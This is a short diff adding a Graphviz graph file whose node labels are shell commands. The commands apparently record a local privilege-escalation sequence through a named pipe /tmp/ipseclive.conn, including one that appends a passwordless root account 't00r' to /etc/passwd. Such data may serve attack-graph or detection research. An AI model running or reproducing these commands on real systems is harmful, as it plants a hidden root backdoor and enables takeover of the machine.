@@ -1,0 +1,12 @@
+digraph {
+0 [label="mkfifo /tmp/ipseclive.conn "];
+0 -> 0
+2 [label="cat /tmp/ipseclive.conn "];
+2 -> 2
+4 [label="echo echo t00r::0:0::/tmp:/bin/sh>>/etc/passwd /tmp/ipseclive.conn "];
+4 -> 4
+6 [label="/tmp/ipseclive.conn "];
+6 -> 6
+8 [label="rm /tmp/ipseclive.conn "];
+8 -> 8
+}
